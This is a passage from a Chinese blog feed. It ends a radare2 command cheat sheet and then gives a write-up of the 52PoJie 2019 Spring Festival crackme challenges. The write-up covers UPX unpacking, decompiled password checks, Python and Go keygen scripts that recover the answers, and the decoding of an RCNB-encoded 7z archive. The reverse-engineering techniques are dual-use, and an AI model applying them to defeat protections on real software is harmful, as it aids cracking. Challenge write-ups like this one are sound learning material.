title="查找"></a>查找</h2><ul><li><code>e search.*</code>——编辑查找配置</li><li><code>/?</code>——列出查找的子命令</li><li><code>/ string</code>——在内存或程序段查找字符串</li><li><code>/R [?]</code>——查找特定的 ROP</li><li><code>/R/</code>——ROP 常规搜索</li></ul><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ul><li><code>dc</code>——继续执行</li><li><code>dcu addr</code>——继续执行到某个地址</li><li><code>dcr</code>——继续执行直到<code>ret</code>（单步步过）</li><li><code>dbt [?]</code>——在<em>dbg.btdepth</em>和<em>dbg.btalgo</em>的基础上回溯指令</li><li><code>doo [args]</code>——重新打开调试并设置参数</li><li><code>ds</code>——单步步入</li><li><code>dso</code>——单步步过</li></ul><h2 id="图形模式"><a href="#图形模式" class="headerlink" title="图形模式"></a>图形模式</h2><ul><li><code>pdf @ addr</code>——输出当前位移下函数的汇编代码</li><li><code>V</code>——可视化模式，使用<code>p</code>/<code>P</code>再两个模式间切换</li><li><code>VV</code>——图形模式，在 ascii 图像下分析</li><li><code>V!</code>——控制板模式，对漏洞利用非常有用</li></ul><p>看看<a href="http://radare.today/posts/using-radare2/" target="_blank" rel="noopener">这篇文章</a>，也许有更多的内容能够帮助到你。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>translation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2019春节-吾爱破解解题领红包活动</title>
    <link href="/2019/02/21/2019%E6%98%A5%E8%8A%82-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/"/>
    <url>/2019/02/21/2019%E6%98%A5%E8%8A%82-%E5%90%BE%E7%88%B1%E7%A0%B4%E8%A7%A3%E8%A7%A3%E9%A2%98%E9%A2%86%E7%BA%A2%E5%8C%85%E6%B4%BB%E5%8A%A8/</url>
    
    <content type="html"><![CDATA[<p>做了点简单的题目。</p><a id="more"></a><h1 id="【春节】解题领红包之一"><a href="#【春节】解题领红包之一" class="headerlink" title="【春节】解题领红包之一"></a>【春节】解题领红包之一</h1><p>扫码关注即可。</p><p><img src="/pics/2019春节-吾爱破解解题领红包活动/1.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之二"><a href="#【春节】解题领红包之二" class="headerlink" title="【春节】解题领红包之二"></a>【春节】解题领红包之二</h1><p>查壳是 upx，ESP 定律法找到 OEP 脱壳。然后放进 ida 里：</p><pre><code class="cpp">HWND main_func(){  HWND result; // eax  char *input; // esi  char *key; // edi  int enc_1; // [esp+0h] [ebp-14h]  int enc_2; // [esp+4h] [ebp-10h]  int enc_3; // [esp+8h] [ebp-Ch]  int enc_4; // [esp+Ch] [ebp-8h]  char v7; // [esp+10h] [ebp-4h]  result = GetDlgItem(0, 1000);  if ( result )  {    if ( GetWindowTextLengthA(result) == 16 )    {      input = (char *)malloc(0x11u);      key = (char *)malloc(0x11u);      *(_DWORD *)input = 0;      *((_DWORD *)input + 1) = 0;      *((_DWORD *)input + 2) = 0;      *((_DWORD *)input + 3) = 0;      input[16] = 0;      *(_DWORD *)key = 0;      *((_DWORD *)key + 1) = 0;      *((_DWORD *)key + 2) = 0;      *((_DWORD *)key + 3) = 0;      key[16] = 0;      GetDlgItemTextA(0, 1000, input, 17);      enc_3 = &#39;udhY&#39;;      enc_1 = &#39;ssdH&#39;;      enc_2 = &#39;zhNb&#39;;      enc_4 = &#39;9102&#39;;      v7 = 0;      encrypt((const char *)&amp;enc_1, (int)key, 3);      if ( !strcmp(key, input) )        result = (HWND)MessageBoxA(0, aOye, Caption, 0);      else        result = (HWND)MessageBoxA(0, aAuey, Caption, 0);    }    else    {      result = (HWND)MessageBoxA(0, &amp;Text, Caption, 0);    }  }  return result;}</code></pre><p>看下来应该就是把 16 位的 <code>enc</code> 加密了一下，然后和 <code>input</code> 比较。看看 <code>encrypt()</code> 函数：</p><pre><code class="cpp">signed int __cdecl encrypt(const char *enc, int key, int num_3){  const char *enc_0; // edx  unsigned int length; // kr04_4  int v5; // esi  int i; // edi  char c; // al  char alphabet[29]; // [esp+Bh] [ebp-1Dh]  char tmp; // [esp+30h] [ebp+8h]  strcpy(&amp;alphabet[1], &quot;abcdefghijklmnopqrstuvwxyz&quot;);  if ( !key )    return -1;  enc_0 = enc;  if ( !enc )    return -1;  if ( num_3 &lt;= 0 )    return -1;  length = strlen(enc) + 1;  if ( (signed int)(length - 1) &lt;= 0 )    return -1;  v5 = key - (_DWORD)enc;  tmp = alphabet[num_3 + 1];  i = length - 1;  do  {    c = *enc_0;    if ( *enc_0 &lt; tmp || c &gt; 122 )    {      if ( c &gt;= 97 &amp;&amp; c &lt;= alphabet[num_3] )        c = c - num_3 + 26;    }    else    {      c -= num_3;    }    (enc_0++)[v5] = c;    --i;  }  while ( i );  return 0;}</code></pre><p>就是对字符串判断是否为字母，然后根据字母表 <code>alphabet</code> 做映射和加减。正向实现一下脚本就得到口令了：</p><pre><code class="python">#!/usr/bin/env pythonenc = (&#39;9102&#39; + &#39;udhY&#39; + &#39;zhNb&#39; + &#39;ssdH&#39;)[::-1]print encalpha = &#39;abcdefghijklmnopqrstuvwxyz&#39;num = 3t = alpha[num + 1]i = len(enc)j = 0res = &#39;&#39;while i != 0:    c = enc[j]    if ord(c) &lt; ord(t) or ord(c) &gt; 122:        if ord(c) &gt;= 97 and ord(c) &lt;= ord(alpha[num]):            c = chr(ord(c) - num + 26)            if ord(c) &gt; ord(alpha[-1]):                c = chr(ord(c) - 26)    else:        c = chr(ord(c) - num)    res += c    j += 1    i -= 1print res# HappyNewYear2019</code></pre><p><img src="/pics/2019春节-吾爱破解解题领红包活动/2.jpg" srcset="/img/loading.gif" alt></p><h1 id="【春节】解题领红包之三"><a href="#【春节】解题领红包之三" class="headerlink" title="【春节】解题领红包之三"></a>【春节】解题领红包之三</h1><p>这道题我查了壳然后不会脱就一直没做。看了 <a href="https://mp.weixin.qq.com/s/R_mWqg2yt1HYkWq4CVbOPg" target="_blank" rel="noopener">writeup</a> 居然是直接进 ida 就分析了。搜索到 main 函数：</p><pre><code class="cpp">int main_main(){  int v0; // ST04_4  _DWORD *v1; // ST04_4  _DWORD *v2; // ST04_4  int v3; // ST04_4  _DWORD *v4; // ST04_4  int v5; // ST10_4  int v6; // ST14_4  int base64_check; // ST18_4  int v8; // ST04_4  int result; // eax  char v10; // ST0C_1  int v11; // [esp+0h] [ebp-7Ch]  int v12; // [esp+4h] [ebp-78h]  int v13; // [esp+4h] [ebp-78h]  int v14; // [esp+8h] [ebp-74h]  int v15; // [esp+Ch] [ebp-70h]  int v16; // [esp+Ch] [ebp-70h]  int v17; // [esp+Ch] [ebp-70h]  char v18; // [esp+Ch] [ebp-70h]  int v19; // [esp+10h] [ebp-6Ch]  int v20; // [esp+10h] [ebp-6Ch]  int v21; // [esp+10h] [ebp-6Ch]  int v22; // [esp+14h] [ebp-68h]  int v23; // [esp+14h] [ebp-68h]  int v24; // [esp+14h] [ebp-68h]  int v25; // [esp+14h] [ebp-68h]  unsigned int v26; // [esp+18h] [ebp-64h]  int v27; // [esp+18h] [ebp-64h]  int v28; // [esp+1Ch] [ebp-60h]  int v29; // [esp+1Ch] [ebp-60h]  int v30; // [esp+20h] [ebp-5Ch]  int aes_check; // [esp+24h] [ebp-58h]  int v32; // [esp+28h] [ebp-54h]  int v33; // [esp+2Ch] [ebp-50h]  int v34; // [esp+2Ch] [ebp-50h]  _DWORD *v35; // [esp+30h] [ebp-4Ch]  _DWORD *v36; // [esp+34h] [ebp-48h]  _DWORD *v37; // [esp+38h] [ebp-44h]  int *v38; // [esp+3Ch] [ebp-40h]  int v39; // [esp+40h] [ebp-3Ch]  int *v40; // [esp+44h] [ebp-38h]  void *v41; // [esp+48h] [ebp-34h]  int *v42; // [esp+4Ch] [ebp-30h]  void *v43; // [esp+50h] [ebp-2Ch]  int *key; // [esp+54h] [ebp-28h]  _DWORD *v45; // [esp+58h] [ebp-24h]  int *v46; // [esp+5Ch] [ebp-20h]  void *v47; // [esp+60h] [ebp-1Ch]  int *uid; // [esp+64h] [ebp-18h]  _DWORD *v49; // [esp+68h] [ebp-14h]  int *v50; // [esp+6Ch] [ebp-10h]  void *v51; // [esp+70h] [ebp-Ch]  int *v52; // [esp+74h] [ebp-8h]  void *v53; // [esp+78h] [ebp-4h]  void *retaddr; // [esp+7Ch] [ebp+0h]  if ( (unsigned int)&amp;retaddr &lt;= *(_DWORD *)(*(_DWORD *)__readfsdword(0x14u) + 8) )    runtime_morestack_noctxt();  v52 = dword_4A04E0;  v53 = &amp;main_statictmp_0;  fmt_Println(&amp;v52, 1, 1);  runtime_newobject(dword_4A04E0, v0);  v36 = v1;  runtime_newobject(dword_4A04E0, v1);  v37 = v2;  v50 = dword_4A04E0;  v51 = &amp;main_statictmp_1;  fmt_Print(&amp;v50, 1, 1);  uid = dword_498EE0;  v49 = v36;  fmt_Scanln(&amp;uid, 1, 1);                       // input uid  v46 = dword_4A04E0;  v47 = &amp;main_statictmp_2;  fmt_Print(&amp;v46, 1, 1);  key = dword_498EE0;  v45 = v37;  fmt_Scanln(&amp;key, 1, 1);                       // input key  runtime_newobject(dword_4A90C0, v3);  v35 = v4;  *v4 = 0x67452301;  v4[1] = 0xEFCDAB89;  v4[2] = 0x98BADCFE;  v4[3] = 0x10325476;  v4[4] = 0xC3D2E1F0;  v4[21] = 0;  v4[22] = 0;  v4[23] = 0;  runtime_stringtoslicebyte(0, *v36, v36[1]);  crypto_sha1___digest__Write(v35, v15, v19, v22, v19, v22);  crypto_sha1___digest__Sum(v35, 0, 0, 0, v5, v6);// get uid&#39;s sha1 digest  if ( v26 &lt; 0x10 )    runtime_panicslice(      v11,      v12,      v14,      v16,      v20,      v23,      v26,      v28,      v30,      aes_check,      v32,      v33,      v35,      v36,      v37,      v38,      v39,      v40,      v41,      v42,      v43,      key,      v45,      v46,      v47,      uid,      v49,      v50,      v51,      v52,      v53);  v34 = v20;  encoding_base64___Encoding__DecodeString(encoding_base64_StdEncoding, *v37, v37[1], v16, v20, v23, v26);  if ( base64_check )  {    v42 = dword_4A04E0;    v43 = &amp;main_statictmp_3;    result = fmt_Println(&amp;v42, 1, 1);  }  else  {    main_AesDecrypt(v17, v21, v24, v34, 16, 16, 0, v28);    if ( aes_check )    {      v40 = dword_4A04E0;      v41 = &amp;main_statictmp_4;      result = fmt_Println(&amp;v40, 1, 1);    }    else    {      if ( v29 == 26 &amp;&amp; (runtime_memequal(v27, MEMORY[0x4B8A80], 26, v18), v10) )        fmt_Printf(aSuccess, 73, 0, 0, 0, v25, v27, 26);      else        fmt_Printf(&amp;aFailed, 24, 0, 0, 0, v25, v27, v29);      runtime_newobject(dword_4A04E0, v13);      v38 = dword_498EE0;      v39 = v8;      result = fmt_Scanln(&amp;v38, 1, 1);    }  }  return result;}</code></pre><p>大概看了一遍之后，可以推测，先分别输入 uid 和 key，然后先进行 base64 解密（如果解密失败则报错），然后用 uid 的 sha1 摘要作为 key 来进行 aes 解密（如果解密失败则报错），最后和数据段中一串长度为 26 的字符串比较。具体字符串我们可以 dump 出来：</p><pre><code class="python">data = [0x48, 0x61, 0x70, 0x70, 0x79, 0x4E, 0x65, 0x77, 0x59, 0x65, 0x61, 0x72, 0x46, 0x72, 0x6F, 0x6D, 0x35, 0x32, 0x50, 0x6F, 0x4A, 0x69, 0x65, 0x2E, 0x43, 0x6E, 0x4C, 0x69, 0x6E, 0x65, 0x20, 0x49, 0x73, 0x6C, 0x61, 0x6E, 0x64, 0x73, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x20, 0x54, 0x69, 0x6D, 0x65, 0x4E, 0x65, 0x77, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x6C, 0x61, 0x6E, 0x64, 0x20, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x20, 0x54, 0x69]output = &#39;&#39;for i in range(26):  output += chr(data[i])print output# HappyNewYearFrom52PoJie.Cn</code></pre><p>可以使用 IDA 进行动态调试来验证 AES 的密钥。先输入 uid 和一个可以被成功解码的 base64 字符串，然后在 AES 函数中设下断点，可以看到密钥即为 uid 的 sha1 摘要：</p><p><img src="/pics/2019春节-吾爱破解解题领红包活动/3.png" srcset="/img/loading.gif" alt></p><p>调试中可以从内存里 dump 得到 <code>3f2481363378f23964b9977ab8bad974de108eee</code> 其实这一串数据就是 uid 对应的 sha1 散列值，取前 16 位作为 AES 的密钥。 AES 加密方式为 <code>CBC</code> （<code>main_AesDecrypt()</code> 函数中可以直接看出），补码方式为 <code>PKCS5Padding</code>（AES 解密错误时，会退出程序，但是有异常信息一闪而过，给报错函数下断点即可查看异常信息）。只需要把密钥转化成字节数组，使用 <code>AES/CBC/PKCS5Padding</code> 方式加密 <code>HappyNewYearFrom52PoJie.Cn</code>，最后进行 base64 加密就可得到口令。go 语言实现代码：</p><pre><code class="go">package mainimport (    &quot;fmt&quot;    &quot;bytes&quot;    &quot;crypto/cipher&quot;    &quot;crypto/sha1&quot;    &quot;crypto/aes&quot;    &quot;encoding/base64&quot;)func PKCS5Padding(ciphertext []byte, blockSize int) []byte {    padding := blockSize - len(ciphertext)%blockSize    padtext := bytes.Repeat([]byte{byte(padding)}, padding)    return append(ciphertext, padtext...)}func PKCS5UnPadding(origData []byte) []byte {    length := len(origData)    unpadding := int(origData[length-1])    return origData[:(length - unpadding)]}func AesEncrypt(origData, key []byte) ([]byte, error) {    block, err := aes.NewCipher(key)    if err != nil {        return nil, err    }    blockSize := block.BlockSize()    origData = PKCS5Padding(origData, blockSize)    blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])    crypted := make([]byte, len(origData))    blockMode.CryptBlocks(crypted, origData)    return crypted, nil}func AesDecrypt(crypted, key []byte) ([]byte, error) {    block, err := aes.NewCipher(key)    if err != nil {        return nil, err    }    blockSize := block.BlockSize()    blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])    origData := make([]byte, len(crypted))    blockMode.CryptBlocks(origData, crypted)    origData = PKCS5UnPadding(origData)    return origData, nil}func main() {    uid := &quot;975446&quot;    h := sha1.New()    h.Write([]byte(uid))    bs := h.Sum(nil)    var aeskey = bs[0:16]    fmt.Println(&quot;AES Key: &quot;, aeskey)    pass := []byte(&quot;HappyNewYearFrom52PoJie.Cn&quot;)    xpass, err := AesEncrypt(pass, aeskey)    if err != nil {        fmt.Println(err)        return    }    pass64 := base64.StdEncoding.EncodeToString(xpass)    fmt.Printf(&quot;Ciphertext: %v\n&quot;,pass64)    bytesPass, err := base64.StdEncoding.DecodeString(pass64)    if err != nil {        fmt.Println(err)        return    }    tpass, err := AesDecrypt(bytesPass, aeskey)    if err != nil {        fmt.Println(err)        return    }    fmt.Printf(&quot;Plaintext: %s\n&quot;, tpass)}</code></pre><h1 id="【春节】解题领红包之番外篇"><a href="#【春节】解题领红包之番外篇" class="headerlink" title="【春节】解题领红包之番外篇"></a>【春节】解题领红包之番外篇</h1><p>番外篇个人感觉应该算是一道 ctf 里的 misc 题了。压缩包里给了一个大部分文字被加密的 md 文件：</p><pre><code class="md"># ȐĆŅƃȓƇńƃȒċƝÞɌÇńßɌĉŇƅŕƇŃbȒȼȵßȒĆȵƁȓĉnƁɌćǸßƦćƝƁȓĉnƅȓčƞÞɌćÑbȒČŃbȒċÑbŕƇŃþȒČNƃȒĈÑƄȓĊÑƄŕƇņÞȓčƞÞɌćÑbȒċƝÞŘcǸÞȐĆŅBƦĊȵþřÇȵƅȐċŇbɌcńþȓČŇƁŕƇNƀȒČŃBɌćÑBɌċnƄȓĈƝbŗƇƞÞŗčnBŕƇnþȒȻŃBȓĉnƅȒČNƅȒƈŇþŕčȠßŕƇŃƃřčȠbřċȵƀȐčNƄŕƇņƃɌcŅƄɌċnþŕƇŇƁȓƇńƁŕƇńþɌcńƄŕƇńþɌCňƀƦȻƝƃŕƇńþɌCňƀȐĉņþŗcŅƅȒĈÑƄȓĊǸƅȓĈȵþɌćƞßŕƇņÞȒȻŃþɌCňƀɌćǸbȒȼǹßȓĈƝB[ƦĉņƃŖċŅþŕƇŅƀȒCŅƀȒƈŇþɌcŅƄɌĉŇßŕƇņÞȓčƞÞȒƈňþŕƇńþȓĉnþȓČŇBŗcŅƅɌćƞƁȓćŅƁŕƇņÞȒȻŃþɌCňƁ](//rcnb.xyz)řĊÑbȒĉȠƀɌćÑbȒċƝÞȓćŅƁɌƈȠƃŕƇŃþȒȻŃþȒĈƞÞȑÇǹƄɌCȠƄƦȻŇƅɌćƞBȐčnÞŗÇÑBřĊÑbɌĆnþŗÇǹbȐȼŃßɌćÑbŕƇņÞȒȻŃƄŕƇņÞɌcńþȒCŅbŕȻŘĈÑƀƝƄŘȻŖĊǸƀrcnƃňßɍĉƞƀRČņbRÇrcnbrcnbrcnbŖĊƝƃrcnbrcnbrcnbrČNþȓĉƞƁnƅŔƇńÞrćǹƁȓĆÑƅŔȼŕÇƞƅƞßȐCŅƁȐƇŖĆňƁɌƇȵƃȑĈȠƃNƃƦčƝƄȓĉŕČňƃŇbȐĆȑćnƅŘȼȵßƞßRĆǸƄɌCƞBȑĊŅÞŗĊɌȼŃßŇƁŔcŔƈǹÞȠƁɌĆńƅɍĉƝÞŖÇɌcŇƅŖĆnþńƁȓČňƄŘȻȓȻnƃǸƁɌCȒćȵƁȵƄɌCŅƅȐčŃƀřCřƇŇƁǸþřÇƞbƦČnbRCƝßȐćǹƁŔȻřȻņBǹBȑċŗÇƞƃȠBɌĆÑƃŕčņƃȓƇńbŖčÑbɌĊŗƈÑBRcƞƁȑƇńÞƦČǹƀǸƀŘcŘȻnƅRCņƃŅƄȐĉNÞŘĈÑƄŕčȐćǹbŇÞȓćǹßɌĈŔȻňƀƝbȐÇrCǹÞȓȻŃBńƄɍċńbɌČŗƇnƅȵƀŗċņßRCŇbřČřćÑƀȐĊŃbǸƅɍcȑCȵbǸßȑƇȑCǹƅŘȻŃƃřċŃþnƄRċǹBrƇńƃŖĈȑĉņbƞƅƦĆrCƝÞƦĆÑBņƄrćȑƇÑƅńƄƦƇŗĆnƀŔĆȠƄȐćNƀÑƅƦȼȓĉŇƄȵßȑCǹƄȐȼŗćȠƃŅBȓCȠƁŔċƝßřcŘčŅbƦĊƝƃɌċƞƀnƁŘȻÑbŖčŗCnþȒȻÑƅNþřȼrƈNƁŕĆƝBȐÇňƅȐCŃßŅƄrćƞƀȓĊńƃŖƇǸƁřċŘćŃƁŘȼÑƅȑċȵƀŃþrƇŃßŕĉrćNþȒȻƝƁɌƈȠbƦĊNƅŔCƝßȓČńÞƦċŇbŖƈņƃŖĉȵþnƃɍĉɌƈňÞřčǹBȠbŕĉřċńþņƄȑÇƞƁȒcŘĉǸƅňƃȒcŔĈńßǹƁƦćȓȼǹƁÑƁƦCȑċŇƄȓƈnƄȵƄrcŘčnƃȵßRčȑcNƁrĊNƅȐÇŇƁņƁȒčnƀɌČňbɌĆrȼƞÞŇƃɌCřÇnþňƅȒȼƝBȑcȐȻnBňƁȑċȓcȠbǹþȑƇǹƁrĈŖƈňƁŗcȵbňþřȼƦĈŃƅňßŗcŃƀƦĊŔcńÞŖĉȠƅŃƁȑĊȐÇȠþƞÞɌƇȵƅȐȼɍĉÑBrƇŇƅŔčƞßnƅŗĈɍĆȵƅŖČņbŖĆȠÞȒċÑƃŗċNƃŕȻŃÞNÞŔčŕĆƞƃNƃRČȐĆņƁŃƀřċŃbȓčƝƃȑcŔĆNþȑčȠbŗĆNþŇƁȓčrčŃƄȑĉnþŅþȓȻřcÑƄŖƇÑßȐĆńbŅbŕĊŃßŕČŇÞȒcÑƁȑĆŘÇńƃRƈǸƅŕcȠbņÞȑċRƈŇƀȐcňþńÞƦĈɍCȠƀÑBRĉǸƁŗȼȑƇnƁȵßŕƇŖċƞƅřƇǹþŇƄŖÇȠƃRĈǸƅŕƇņþŔĊřƈňbƝßrƈŕÇǸþŃÞȐĆnbȑĉȑȻǸƃǹƀRƇrƈNbnƄrċrĉŅBƦcňþRċňƁnBŗȼÑƁŕċƞßɍĈŗćņƀǹƁȑĈŅþŔƇňƅŗƇrĊǹƄǸßȒƈǹßŕȻȠBŔćƝþŔȻÑBȓĆǸÞȑċŕĉŃþŃƀŘcřȻÑBŅƀɌƈńƄŔĊÑÞƦĈƞƃȓȼņƁŘȻnƄŔćŖċǸƄŅBŖÇȓĉŅBňƄȐȼŖÇņbǹƅrȻÑÞŔČŅßŔĊNþɌƇȠÞRĉnþřčŕċNþȠþƦȼȠƅRĆÑƄŗćŘčŃƄŖÇÑƄǹbȑĆŖÇǹþƞƄȓcƞƁRCǸƄɍćȒČNƅȓȻňÞņBRĆƞbřƇŖcȠbřȻńƄŗĆŃÞŃBƦĉŗĊNþřĊņßȒĆȠƁȑĊŅBȐƈȵBǹƁřcrĉƞbnƀƦċŘȼÑƀȒÇńƁŗCȠƁƝßrĊǹþŗȻŃƀȒȻɍċNßŖĉǸßŃÞrƇȒȼȠƃřƇŃƃNbŘċƦČňƅŔČnBŗČƞbƞßŔȼŔĊȠƀnƅŖċŕčŇƄǹBŔCřċǹƅȐČňƀƝƀřĈŖČȵßńÞɌCǹƃŔćȓċÑþŕȼƝƄȒcńbǹbȓƈƝƅɌĆȠƄŖćǹBŖƈŘÇƝƅƦĉŃƁŃßŖĉNƃŔĉÑƄŖĈƞþȑČȑČnBŃƁŔČnƃȒĈȓĈNBǸßȐCȠßȐčŅbɍĉƞþƦĉrȻŅBŇßȒȻǸƁŘȼŘċńBňbŘčnƄŘÇȒƈŇƅǹÞřćȐćŅÞƦċŇƄŇbɌƇƦƇńƀňƁrČRČņbȑÇŅßȵƅřȼŖĆǸƀŔCƝƀņÞȓƇrĊŇþňbŕÇŃƄŔƈńÞŘČȐĊƝbřȻǹƃɌČȠBńƄȒƇNþřĊɌćņBŕȼȠƃŖƇňþÑßȓȼȑČÑƅnƄɍĉnÞŗcŘƈňßȓĉȵƄȑcNbȠßƦÇŅƃɍĈƦĊnƁŖÇŅBŔcŃƁńƁɌċňÞŕĉƦCņƅƦȻȵƅȓÇǹƃȓĆȠƃRȻňƃřćǸƀŗƈǹßřĉňbȐČńƁɍĈŇÞÑÞŘćŗÇNbŗȻÑÞRƈǸƃǹƀŕȻRĉƞBńþŘȻŔĆƝƁņBŕȻNBRĉņƃȓČƝƁȐċÑƀRČŕƈňƀrčŇƅȐĊŅÞƦȼǹƁňƃȓĊnþřĈŘCnþȠƀȒcƞƃɌćɌĊȵƅŕƇňƃnƄŔčńÞRČřȼńbŇßŕĊňþŘCǹbŔĈnbŕĊńþȑcŃƄŔĈŔčńbȐčȠBřĉŅƃņƃŘƈɌÇÑÞŇƄȓĉɍċňƅńþŗCřČƝƄRCņÞƝƁŔĈRȼNƅȒCnƃɌƇǹßńÞŕƈŇBŘCŕȼÑBȒÇŃÞǸƁȓȼŕČȠþȵƁȑƈńƀŔcȑƇÑßrƈǸÞrcŃÞŇƅȓćɌćńƀɍćňƀȠƅŘȼǸƁɍĊřčƞÞņƃrĊǸƀŗcȓƈńƀŇƀȐcrĊŅBȓĈȠƁɍćnƁnÞɌƇÑƃȐȼƞßŔCɍćƞbƝBȒcņƁrċnBŗƈȓȻńƃɌCÑBƞƀȒČňßŔƇřƇǹbŖcņƃŕĆňþŕČņƅȒĉŇƅȐĈŇƁȠƃRĉŔƇǸþŘĊȵßŔȼńbȑƈȠBǹBɌčȵƃrčǹƄŔȻƞƅŗȼȒĆƞƀŖĉȵbŕcƝÞȒȼńBrċǸƅŘcȠÞȐčƝbȓĊŅbŘCȠƀɍĆȠƅŕĉNƀȠÞŖćřċńƁńþȓĉȠƁƦȻnƀȓÇɍĈŅƅǸƀȓčȒȻņƀǹÞɍcȑĆȵƃrȻƝƀɌCŃþɍĈȵþŖČņßňƅŗĉÑÞŕƈȑcŃƁǸßȒƇȐÇƞßńbŕƈȵBŕƇnƄȓċȑȼȠBɍċŅÞŗċŅƃƦčńƄňÞRÇrcŅƄȐÇȠÞřčȠÞƞBɌȼɍĈŇþɍĉÑƅǸBrĆňƃŖȻŕčȵbņßŘĊƞƀȐƈnþŘčȓȻÑÞŕcńþņbŔȼɌČÑBɌčȵbȑĈŅBŕĉƞƄÑþȒÇȓȻNƀÑßŘĈÑƀȐȼƝBŔĈȵþɍĊÑßŕĉȒȼnþŕÇņbńþɍĆŅÞŗĊŃƃRċņƅŘcNþȑĆŅƁrƈǸƄȒCƝþŖȻrÇŇbřĊŅƅȑƈŃBƦċnßňƅƦĉÑþȓĈřȼŃƀɍcŃƄȵþɌCřĆNƄǹƄƦȻŔčŅƃnƅrċrCǸƄȓƈŃƀrÇnƁrCÑƅrCȵƀrƈǹßrƈȵƁRĆƞƁrÇŇÞȵßƦČȑȼǸƁǹBȑcɌƈƝÞȒĆŅÞrĆňƃRćŇƁȠƅȓcrc</code></pre><p>这里给了一个网站，上面可以解密，得到明文 md 文件：</p><pre><code class="md"># Prove your NiubilityHello there, Welcome to the 52PoJiE Spring Festival 2019 Challenge - RCNB.To prove you are as NB as RC, complete this trial![It&#39;s dangerous to go alone, take this!](//rcnb.xyz)And the key: Which_is_N0t_Th3_Answ3rWith the trial:7z��&#39;�G�֐&#39;�l×v����2!���!$�x�Z�ˤ�XЂY�=��W�K�ï�z���������r�$]�I��q�Ib��iԎ�2C���Z�`�3��EW�w3X�� ��*2� &#39;]�Kz�,&lt;` ��5�&amp;�QT�~�z�rq+�I�1԰����r?�R���Y�5X�&lt;rA���U��[���G��^*�O- GP���l����.:�7�3��:*J(v��]��,�h����nOˁ��X�&amp;�6�=Z\����g�h�y6I��nNJ�)�&amp;���yCE��A��#�8��ȍr&#39;�M\?o:��W��Va�)����D��.�5V��Gi��A��)�,~� H¬?���&amp;��V�����~*;�P|�(\$�e00&quot;�� 荈{�����8�]�-1��_Z��G=�)oPd��)���w;����8zOi��|&amp;���]à�&#39;�C�q�����SD&gt;��!��b��*� |�F�-�&#39;����-�ڷ��� 畢{�ٙ�� �ti��E��ޕ;�����[&#39;��Yl�י*b����G�1�B�����~�:�و��׉��Aenqd�)ü#�EG-:�S/�ACb*[�V�H�l=Vg�-�۴�b7&amp;���ihCz��KLE0��)��H 咣 BT�0(k����m�&quot;�`��b�ĥq�&lt;IU�1������\��[� k��%���&quot;ɡ� 菽 a8��H��gb��Q J��ZLL�� �*�\$�|�ɡ����R�E�wu��t7#)S�\�����;{l�W�����I�*Y��}��GN�p�k\*�?�2�@�S�}���33���v ���/���^Ӈ��!�R�N��F��5[�2�bvX ��ߍ�E؞%���d��� ��T�@��dy��r��B� ��?aHx�����&quot;�g���� 呴^+��|t$}�x�C.���bp �X�lU|��&amp;׶��}(���O�eq8s=店 �C�#^�c�Q��&gt;�8��^���֙���b6&amp;��i�5FT�m$5�|�X�tA���s��}��.h���Y��r�}�(�,�&lt;W���V�����`�V08K�� -V�CV��}�~d��� 0�y��q����wWxZe��#q&quot;�״�=�%��h�!��_�������#��ᷫDA8^kJqɊ�=E�{%�m&gt;��k� p\$�SL˓`��]ybv��</code></pre><p>最后面给出的 trial 看开头显然是个 7z，那上面的 key 应该就是密码了。我把它存为一个新文件，然而这个字符<code>�</code>严重干扰了我好几个小时，让懵逼的我一度以为这是题目设计的加密。一开始我 <code>xxd</code> 了一下文件，发现有三个字节 <code>efbfbd</code> 频繁出现 505 次：</p><p><img src="/pics/2019春节-吾爱破解解题领红包活动/4.png" srcset="/img/loading.gif" alt></p><p>根据 7z 文件头 <code>377a bcaf 271c 0004</code> 尝试过替换，一度以为掉进了脑洞的陷阱。直到我看到<a href="https://liudanking.com/golang/utf-8_replacement_character/" target="_blank" rel="noopener">这篇文章</a>，才知道这串字节就是那个字符。</p><p>后来在 github 上找到了 rcnb 的源码，修改 js，将明文每个字节以 int 的形式输出，再用 python 一跑拿到压缩包：</p><pre><code class="js">function printRes(str) {  var res = rcnb.decode(str);  for (var i = 0; i &lt; res.length; i++) {    console.log(res[i]);  }  // 